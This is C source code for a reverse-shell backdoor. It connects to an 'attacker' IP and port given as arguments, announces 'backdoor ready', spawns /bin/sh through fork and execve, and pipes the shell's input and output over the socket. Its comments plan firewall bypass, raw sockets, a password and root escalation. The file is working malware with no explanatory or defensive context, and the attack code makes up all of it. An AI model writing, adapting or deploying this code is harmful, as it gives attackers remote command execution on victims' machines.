#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include<errno.h>
#include<signal.h>
#include<unistd.h>

#define DEBUG

#define BUF_SIZE 65000 

//figure out to bypass firewall and establish connection
establish_connection(struct sockaddr_in *client){
	int s;
	//later make it raw sockets
	if( (s = socket(PF_INET,SOCK_STREAM,0)) == -1) error();
        if( connect(s,(struct sockaddr *)client,sizeof(struct sockaddr)) == -1) error();
	return s;
}

close_connection(int s){

	if( close(s) == -1) error();
	return 0;
}

error(){
	
	printf("error : %d %s\n",errno,strerror(errno));
	exit(-1);
}

main(int argc,char **argv){

//Setup socket structure and connection
	char *_buf = (char *)malloc(BUF_SIZE);
        //char *cli_buf = (char *)malloc(BUF_SIZE);
        unsigned int i = 0;
        int s,n,nslct,start = 0,slctfd,tmp;
        int parent_wr[2],child_wr[2];
	char *env[] = {_buf,0},temp[100];
        fd_set rdset,wrset;
	struct sockaddr_in attacker;
	
	attacker.sin_family = AF_INET;
	attacker.sin_port = htons(atoi(argv[1]));
	attacker.sin_addr.s_addr = inet_addr(argv[2]);
	memset(&attacker.sin_zero,'\0',8);
	s = establish_connection(&attacker);
	sprintf(_buf,"backdoor ready\n");
	write(s,_buf,strlen(_buf));
	//Password
//	recv(s,_buf,BUF_SIZE,0);
	pipe(parent_wr);
	pipe(child_wr);
	signal(SIGCHLD,SIG_IGN);
//	if(setuid(0) == -1) error();
	
	switch(fork()){
		case -1: error(); break;
		case 0:
			close(parent_wr[1]);
			dup2(parent_wr[0],0); dup2(child_wr[1],1); dup2(child_wr[1],2);
			#ifdef DEBUG
			 fprintf(stdout,"child process calling exec()\n");
			#endif
			execve("/bin/sh",env,NULL);
		break;
		default:
			for(i = 0;i<3;i++) dup2(s,i);
			close(child_wr[1]); close(parent_wr[0]);
			FD_ZERO(&rdset);
        		FD_ZERO(&wrset);
			slctfd = 15;
			while(1){
				FD_SET(child_wr[0],&rdset);
                        	FD_SET(s,&rdset);
                        #ifdef DEBUG
			 fprintf(stdout,"calling select\n");
			#endif
                                nslct = select(slctfd,&rdset,NULL,NULL,NULL);
			#ifdef DEBUG
			 fprintf(stdout,"select returned with : %d\n",nslct);
			#endif
                                if(FD_ISSET(s,&rdset)){
				#ifdef DEBUG					
				 fprintf(stdout,"reading from socket\n");
				#endif
					n = recv(s,_buf,BUF_SIZE,0);
				#ifdef DEBUG					
				 fprintf(stdout,"recv returned with n :%d\nwriting to pipe\n",n);
				#endif
					tmp = write(parent_wr[1],_buf,n);
				#ifdef DEBUG
				 fprintf(stdout,"written %d bytes to pipe\n",tmp);
				#endif
					if(!--nslct) continue;
				}
				if(FD_ISSET(child_wr[0],&rdset)){
				#ifdef DEBUG					
				 fprintf(stdout,"reading from pipe\n");
				#endif
					n = read(child_wr[0],_buf,BUF_SIZE);
					send(s,_buf,n,0);
					if(!--nslct) continue;
				}
			}
		break;
	}


}  
